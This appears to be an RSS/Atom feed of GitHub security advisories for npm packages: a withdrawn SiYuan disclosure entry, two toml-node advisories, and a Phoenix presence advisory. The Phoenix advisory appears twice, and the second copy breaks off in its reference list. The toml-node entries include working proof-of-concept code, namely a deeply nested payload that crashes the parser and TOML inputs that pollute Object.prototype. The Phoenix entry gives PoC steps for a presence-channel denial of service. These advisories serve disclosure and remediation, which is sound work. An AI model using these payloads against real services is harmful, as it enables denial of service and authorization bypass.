<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-09-04T01:53:04.810Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[siyuan] Duplicate Advisory: SiYuan: Cross-boundary content disclosure via getBacklinkDoc/getBackmentionDoc (publish mode): reader-reachable rendered DOM of publish-forbidden docs; sibling list endpoints are filtered]]></title>
        <id>https://github.com/advisories/GHSA-2mmh-4rf8-7xg6</id>
        <link href="https://github.com/advisories/GHSA-2mmh-4rf8-7xg6"/>
        <updated>2026-09-03T21:21:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-36v8-mpjm-8j5r. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>SiYuan before v3.7.3 fails to apply publish-access filters to the getBacklinkDoc and getBackmentionDoc content endpoints (/api/ref/getBacklinkDoc and /api/ref/getBackmentionDoc). While the corresponding backlink list endpoints filter publish-forbidden documents, the content endpoints (gated only by CheckAuth) do not. A publish-mode reader — including an anonymous reader when publish Basic Auth is disabled — can call these endpoints directly with a publish-forbidden document's ID to retrieve its rendered DOM content and to determine whether the document references a given block (a reference-existence oracle).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-36v8-mpjm-8j5r">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-36v8-mpjm-8j5r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-68586">https://nvd.nist.gov/vuln/detail/CVE-2026-68586</a></li>
<li><a href="https://www.vulncheck.com/advisories/siyuan-before-content-disclosure-via-getbacklinkdoc">https://www.vulncheck.com/advisories/siyuan-before-content-disclosure-via-getbacklinkdoc</a></li>
<li><a href="https://github.com/advisories/GHSA-2mmh-4rf8-7xg6">https://github.com/advisories/GHSA-2mmh-4rf8-7xg6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2mmh-4rf8-7xg6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-03T15:32:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[toml] toml-node: Uncontrolled Recursion]]></title>
        <id>https://github.com/advisories/GHSA-82x6-q7mm-w9cf</id>
        <link href="https://github.com/advisories/GHSA-82x6-q7mm-w9cf"/>
        <updated>2026-09-03T20:56:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>toml.parse()</code> crashes with an uncaught <code>RangeError: Maximum call stack size exceeded</code> when parsing deeply nested arrays or inline tables. The parser is generated by <strong>Peggy 5.1.0</strong> (a PEG parser generator) as a recursive-descent parser; the value rule mutually recurses with the array and inline-table rules with <strong>no depth limit</strong>, so nesting depth equal to the input depth exhausts Node's call stack.</p>
<p>A small payload — a bare array nested a few thousand levels deep (<strong>~5–6 KB</strong>) — reliably crashes the process on a default Node.js configuration. <code>toml</code> has <strong>~47 million monthly downloads</strong>.</p>
<hr>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<p>The parser is a <strong>generated</strong> recursive-descent parser (<code>lib/parser.js</code>, header: <code>// @generated by Peggy 5.1.0.</code>). The recursion sink is the mutual recursion between the <code>value</code>, <code>array</code>, and <code>inline_table</code> rule functions — none carry a depth counter:</p>
<pre><code class="language-javascript">// lib/parser.js — peg$parsevalue() @ line 1008
function peg$parsevalue() {
  ...
  s0 = peg$parsearray();          // line 1017  ← value → array
  if (s0 === peg$FAILED) {
    s0 = peg$parseinline_table(); // line 1019  ← value → inline_table
  }
  ...
}

// peg$parsearray() @ line 2879
function peg$parsearray() {
  ...
  s3 = peg$parsevalue();          // line 2931  ← array element → value (back-edge)
  ...
}

// peg$parseinline_table() @ line 3066 → peg$parseinline_table_entry() @ line 3239
function peg$parseinline_table_entry() {
  ...
  s5 = peg$parsevalue();          // line 3266  ← inline-table value → value (back-edge)
  ...
}
</code></pre>
<p><strong>Recursion cycle</strong> for <code>a=[[[ … ]]]</code> (bare nested arrays):</p>
<pre><code>toml.parse(src)
  → peg$parsevalue()        # parser.js:1008
      → peg$parsearray()     # parser.js:1017 / 2879
          → peg$parsevalue() # parser.js:2931  ← back-edge, per nested element
              → …            # depth == input nesting → RangeError, no guard
</code></pre>
<p>Inline tables (<code>{arr=[ … ]}</code>, <code>{a={a= … }}</code>) reach the same cycle via <code>peg$parseinline_table</code> / <code>peg$parseinline_table_entry</code>. Because the parser is machine-generated, there is no hand-written function to patch; the fix belongs in the grammar (<code>src/toml.pegjs</code>) or in an input guard (see <em>Suggested Fix</em>).</p>
<hr>
<h2 id="confirmed-poc-toml-412-nodejs-v24160">Confirmed PoC (toml 4.1.2, Node.js v24.16.0)</h2>
<p><strong>Setup:</strong></p>
<pre><code class="language-bash">npm install toml@4.1.2        # latest release; 4.1.1 and earlier are equally affected
# Docker equivalent:
# docker run --rm node:24 bash -c "npm i -g toml &gt;/dev/null 2&gt;&amp;1; node -e '&lt;PoC below&gt;'"
</code></pre>
<p><strong>Reproduce</strong> — save as <code>poc.js</code>, run <code>node poc.js</code>:</p>
<pre><code class="language-javascript">const toml = require('toml');
console.log('version:', require('toml/package.json').version);  // 4.1.2

// Smallest reliable payload: a bare array nested 3000 levels (~6 KB)
let x = '1';
for (let i = 0; i &lt; 3000; i++) x = '[' + x + ']';
const payload = 'a=' + x;
console.log('payload bytes:', payload.length);   // 6003

try {
  toml.parse(payload);
  console.log('no crash');
} catch (e) {
  console.log('CONFIRMED:', e.constructor.name + ':', e.message.slice(0, 40));
  console.log('is RangeError?', e instanceof RangeError,          // true
              '| is SyntaxError?', e instanceof SyntaxError);     // false
}
</code></pre>
<p><strong>Expected output (vulnerable — actual run):</strong></p>
<pre><code>version: 4.1.2
payload bytes: 6003
CONFIRMED: RangeError: Maximum call stack size exceeded
is RangeError? true | is SyntaxError? false
</code></pre>
<p><strong>Verified crash thresholds (fresh process, single parse, default Node 24 stack):</strong></p>
<table>
<thead>
<tr>
<th>Payload shape</th>
<th>Reliable crash depth</th>
<th>Payload size</th>
</tr>
</thead>
<tbody><tr>
<td>Bare nested array <code>a=[[ … ]]</code></td>
<td>≥ ~2,500</td>
<td><strong>~5 KB</strong> (6 KB at depth 3000, used above)</td>
</tr>
<tr>
<td>Inline table <code>{arr=[ … ]}</code></td>
<td>≥ ~1,500</td>
<td>~12 KB</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>Note on the exact threshold:</strong> the precise crashing depth is not perfectly deterministic — it shifts by a few hundred levels depending on V8 JIT state, Node version, platform, and any configured <code>--stack-size</code>. This is expected for a stack-overflow condition. A payload nested a few thousand levels deep (single-digit KB) crashes reliably across runs; the PoC above (depth 3000) leaves ample margin.</p>
</blockquote>
<hr>
<h2 id="realistic-attack-scenario">Realistic Attack Scenario</h2>
<pre><code class="language-javascript">// Node.js service parsing user-supplied TOML config
const express = require('express');
const toml = require('toml');
const app = express();
app.use(express.text({ type: 'application/toml', limit: '100kb' }));

app.post('/config', (req, res) =&gt; {
  try {
    const config = toml.parse(req.body);   // ← RangeError on ~6 KB nested payload
    res.json({ status: 'ok' });
  } catch (e) {
    // toml only throws a peg$SyntaxError (e.name === 'SyntaxError', with e.line/e.column)
    // on malformed input. A RangeError has neither, so this guard rethrows it:
    if (e.line != null) return res.status(400).json({ error: e.message });
    throw e;                                // RangeError propagates → uncaught → worker down
  }
});
</code></pre>
<p>An unauthenticated attacker POSTs a ~6 KB deeply nested body (well under the 100 KB limit). <code>toml.parse</code> overflows the stack and throws <code>RangeError</code>; any handler that only special-cases syntax errors rethrows it, taking down the request (and, depending on the server, the worker).</p>
<blockquote>
<p>The package exports <strong>only</strong> <code>parse</code> (<code>Object.keys(require('toml'))</code> → <code>['parse']</code>); there is <strong>no</strong> <code>toml.SyntaxError</code>. Code written as <code>catch (e) { if (e instanceof toml.SyntaxError) … }</code> is itself broken (<code>instanceof undefined</code> throws), so applications generally cannot cleanly distinguish the DoS <code>RangeError</code> from a normal parse error.</p>
</blockquote>
<hr>
<h2 id="impact">Impact</h2>
<p>Any Node.js application that calls <code>toml.parse()</code> on untrusted input is exposed to a remote, unauthenticated denial of service via a small (<del>5–6 KB) deeply nested payload. <code>toml.parse</code> is the package's only public API, and TOML is commonly parsed from user-supplied config/upload endpoints. With **</del>47 million monthly downloads** and <strong>0 existing CVEs</strong>, the exposure is broad.</p>
<p><code>RangeError</code> is a subclass of <code>Error</code> (not of the parser's <code>SyntaxError</code>), so it bypasses the usual "is this a parse error?" checks and propagates as an unexpected exception.</p>
<hr>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Because <code>lib/parser.js</code> is generated, the fix should be applied at the grammar level and regenerated, or guarded at the entry point:</p>
<p><strong>Option 1 — grammar-level depth guard (<code>src/toml.pegjs</code>), then re-run Peggy:</strong></p>
<pre><code class="language-javascript">// In the grammar initializer:
{ let depth = 0; const MAX_DEPTH = 500; }

// Wrap the recursive `value` rule:
value = &amp;{ if (++depth &gt; MAX_DEPTH) { error("TOML nesting too deep"); } return true; }
        v:(array / inline_table / ...) { depth--; return v; }
</code></pre>
<p><strong>Option 2 — entry-point guard in <code>index.js</code></strong> (reject pathological input before parsing):</p>
<pre><code class="language-javascript">module.exports.parse = function (input) {
  // cheap structural bound before the recursive parse
  let depth = 0, max = 0;
  for (const ch of input) {
    if (ch === '[' || ch === '{') max = Math.max(max, ++depth);
    else if (ch === ']' || ch === '}') depth--;
  }
  if (max &gt; 500) throw new Error('TOML nesting depth exceeds limit (500)');
  return realParse(input);
};
</code></pre>
<p><strong>Immediate mitigation (users, verified):</strong> bound untrusted input length <strong>and</strong> bracket-nesting depth before calling <code>toml.parse()</code>, e.g. reject payloads whose maximum <code>[</code>/<code>{</code> nesting exceeds a few hundred. A byte-length limit alone is insufficient (5 KB already crashes).</p>
<hr>
<h2 id="comparison-with-related-vulnerabilities">Comparison with Related Vulnerabilities</h2>
<p>Same CWE-674 class as the recursion-DoS findings in the PyPI <code>toml</code> package (C055) and the YAML parsers (PyYAML GHSA-r9mm-j37c-pjwp, ruamel.yaml). The distinguishing detail here: the parser is <strong>generated by Peggy</strong>, so the recursion lives in <code>peg$parsevalue</code>/<code>peg$parsearray</code>/<code>peg$parseinline_table</code> and cannot be fixed by editing a hand-written function — the earlier draft of this report incorrectly showed hand-written <code>parseValue(tokens, index)</code> functions that do not exist in the package.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-82x6-q7mm-w9cf">https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-82x6-q7mm-w9cf</a></li>
<li><a href="https://github.com/BinaryMuse/toml-node/pull/72">https://github.com/BinaryMuse/toml-node/pull/72</a></li>
<li><a href="https://github.com/BinaryMuse/toml-node/commit/967b8b06754f3ecd9863cea118dc50792a8c353f">https://github.com/BinaryMuse/toml-node/commit/967b8b06754f3ecd9863cea118dc50792a8c353f</a></li>
<li><a href="https://github.com/advisories/GHSA-82x6-q7mm-w9cf">https://github.com/advisories/GHSA-82x6-q7mm-w9cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82x6-q7mm-w9cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-03T20:56:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[toml] toml-node: Prototype Pollution Leads to `Object.prototype` Corruption via `__proto__` Key-Path Desynchronization]]></title>
        <id>https://github.com/advisories/GHSA-v5mp-jgw5-2x6j</id>
        <link href="https://github.com/advisories/GHSA-v5mp-jgw5-2x6j"/>
        <updated>2026-09-03T20:55:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>toml.parse()</code> writes attacker-controlled keys onto <code>Object.prototype</code>. The compiler protects the tables it builds by creating them with <code>Object.create(null)</code>, which neutralizes a direct <code>[__proto__]</code> table. An attacker bypasses that protection by routing a table path <em>through a scalar value</em> and into the real prototype chain: a path such as <code>a.b.y.__proto__.__proto__</code>, where <code>a.b.y</code> holds a number, resolves to <code>Object.prototype</code> and every subsequent key/value writes onto it.</p>
<p>The bypass succeeds because the compiler's duplicate-key guards track paths with keys that do not match the keys used during traversal. The tracking strings and the traversal strings <strong>desynchronize</strong>, so the guard that should reject descending through an existing scalar never fires.</p>
<h3 id="steps-to-reproduce">Steps to reproduce</h3>
<ol>
<li><p>Install the latest version and run the comma-desynchronization payload.</p>
<pre><code class="language-bash">npm install toml@4.1.1
</code></pre>
<pre><code class="language-js">const toml = require("toml");
delete Object.prototype.polluted;

toml.parse(`
[a.b]
y = 1
[a.b.y.__proto__.__proto__]
polluted = "yes"
`);

console.log(({}).polluted);   // -&gt; "yes"
</code></pre>
</li>
<li><p>Observe that a freshly created object inherits the injected key, confirming <code>Object.prototype</code> was modified:</p>
<pre><code>yes
</code></pre>
</li>
<li><p>Confirm the prefix-clear variant reaches the same result:</p>
<pre><code class="language-js">toml.parse(`
aa = 1
[[a]]
[aa.__proto__.__proto__]
polluted = "yes"
`);
console.log(({}).polluted);   // -&gt; "yes"
</code></pre>
</li>
</ol>
<p>A nested gadget object is also injectable, not only scalar keys:</p>
<pre><code class="language-js">toml.parse(`
[a.b]
y = 1
[a.b.y.__proto__.__proto__.code]
val = "arbitrary"
`);
console.log(({}).code.val);     // -&gt; "arbitrary"
</code></pre>
<h3 id="technical-details">Technical details</h3>
<p>The compiler builds the result tree in <code>lib/compiler.js</code>. Tables are created with a null prototype, so a direct <code>[__proto__]</code> table only sets an ordinary own property and does not pollute:</p>
<pre><code class="language-js">var data = Object.create(null);   // line 7 — root has no prototype
// ...
target[k] = Object.create(null);  // line 64 — intermediate tables, no prototype
</code></pre>
<p>The defect is in <code>deepRef</code>, which resolves a table path by walking each key segment of the live object graph:</p>
<pre><code class="language-js">function deepRef(start, keys, value, off) {        // lib/compiler.js:183
  var traversedPath = "";
  var ctx = start;
  for (var i = 0; i &lt; keys.length; i++) {
    var key = keys[i];
    traversedPath = traversedPath ? traversedPath + "." + key : key;
    if (typeof ctx[key] === "undefined") {
      if (i === keys.length - 1) { ctx[key] = value; }
      else { ctx[key] = Object.create(null); }
    } else if (i !== keys.length - 1 &amp;&amp; valueAssignments.has(traversedPath)) {
      genError("Cannot redefine existing key '" + traversedPath + "'.", off);  // line 197 — the guard
    }
    ctx = ctx[key];                                // line 200 — follows __proto__ into the prototype chain
    if (ctx instanceof Array &amp;&amp; ctx.length &amp;&amp; i &lt; keys.length - 1) {
      ctx = ctx[ctx.length - 1];
    }
  }
  return ctx;
}
</code></pre>
<p>Two problems combine:</p>
<p><strong>1. <code>deepRef</code> treats <code>__proto__</code> (and <code>constructor</code>, <code>prototype</code>) as ordinary traversable keys.</strong> Line 200 executes <code>ctx = ctx[key]</code> for every segment with no reserved-key check. When traversal reaches a scalar value — for example the number <code>1</code> stored at <code>a.b.y</code> — the next two <code>__proto__</code> segments evaluate to <code>Number.prototype</code> and then <code>Object.prototype</code>. The null-prototype hardening covers only the <em>container tables</em> the compiler creates; it does not cover the <em>values</em> stored in them, and those values carry normal prototypes.</p>
<p><strong>2. The guard on line 197 is defeated by a path-format desynchronization.</strong> <code>currentPath</code> is assigned two incompatible types: <code>setPath</code> stores an <strong>array</strong> (<code>currentPath = path</code>, line 151) while <code>addTableArray</code> stores a <strong>string</strong> (<code>currentPath = quotedPath</code>, line 172). When <code>assign</code> later builds the path of a value, it concatenates that array with a string:</p>
<pre><code class="language-js">var fullPath = currentPath ? currentPath + "." + keys.join(".") : keys.join("."); // line 77
valueAssignments.add(fullPath);                                                   // line 86
</code></pre>
<p>For the table <code>[a.b]</code>, <code>currentPath</code> is the array <code>["a","b"]</code>, so <code>currentPath + "."</code> coerces it via <code>Array.toString()</code> to the <strong>comma-joined</strong> string <code>"a,b"</code>. The value <code>y = 1</code> is therefore recorded as <code>"a,b.y"</code>. But <code>deepRef</code>, walking the path <code>a.b.y.__proto__.__proto__</code>, builds <code>traversedPath</code> with dots and checks <code>valueAssignments.has("a.b.y")</code>. The set contains <code>"a,b.y"</code>, not <code>"a.b.y"</code>, so the lookup misses and the guard never raises "Cannot redefine existing key". Traversal proceeds through the scalar <code>1</code> into <code>Object.prototype</code>.</p>
<p>Instrumenting the tracking sets after parsing the payload confirms the mismatch:</p>
<pre><code>assignedPaths    : [ "a.b", "a,b.y", "a.b.y.__proto__.__proto__", ... ]
valueAssignments : [ "a,b.y", ... ]
deepRef checks valueAssignments.has("a.b.y")  -&gt;  false   (recorded as "a,b.y")
</code></pre>
<p>A second route reaches the same state without the comma trick. A table array <code>[[a]]</code> triggers the prefix-clearing loop in <code>addTableArray</code>, which deletes tracking entries by string prefix and wipes the guard state before the <code>__proto__</code> descent:</p>
<pre><code class="language-js">assignedPaths.forEach(function(p) {                 // lines 164-166
  if (p.indexOf(quotedPath) === 0) assignedPaths.delete(p);
});
valueAssignments.forEach(function(p) {              // lines 167-169
  if (p.indexOf(quotedPath) === 0) valueAssignments.delete(p);
});
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Any application that calls <code>toml.parse()</code> on a TOML document an attacker can influence — uploaded configuration, project manifests, multi-tenant settings, package metadata — allows the attacker to write arbitrary properties onto <code>Object.prototype</code>.</li>
<li>Injected properties become visible on every object in the process. Depending on application gadgets, this enables denial of service (corrupting properties the runtime relies on), logic and authorization bypass (overriding flags read from plain objects), and, with a suitable sink, remote code execution.</li>
<li>The blast radius is the whole Node.js process, not just the parsed result object.</li>
<li><code>toml</code> reports roughly 14.8 million weekly downloads and around 1,340 dependents, so the transitive exposure is large. Dependents that pass <code>toml</code> as the engine to front-matter or configuration loaders inherit the issue.</li>
</ul>
<hr>
<p>Credit: Duy Bui / @<a href="http://calif.io/">calif.io</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-v5mp-jgw5-2x6j">https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-v5mp-jgw5-2x6j</a></li>
<li><a href="https://github.com/BinaryMuse/toml-node/commit/def6ab5ea99038c0dd482cd6af1745a6af8b4c44">https://github.com/BinaryMuse/toml-node/commit/def6ab5ea99038c0dd482cd6af1745a6af8b4c44</a></li>
<li><a href="https://github.com/BinaryMuse/toml-node/commit/dfaff662276adc38a2e03df3139f7119b0185463">https://github.com/BinaryMuse/toml-node/commit/dfaff662276adc38a2e03df3139f7119b0185463</a></li>
<li><a href="https://github.com/advisories/GHSA-v5mp-jgw5-2x6j">https://github.com/advisories/GHSA-v5mp-jgw5-2x6j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v5mp-jgw5-2x6j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-03T20:55:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
        <updated>2026-09-03T20:30:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
<h3 id="details">Details</h3>
<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
        <updated>2026-09-03T20:30:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
<h3 id="details">Details</h3>
<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
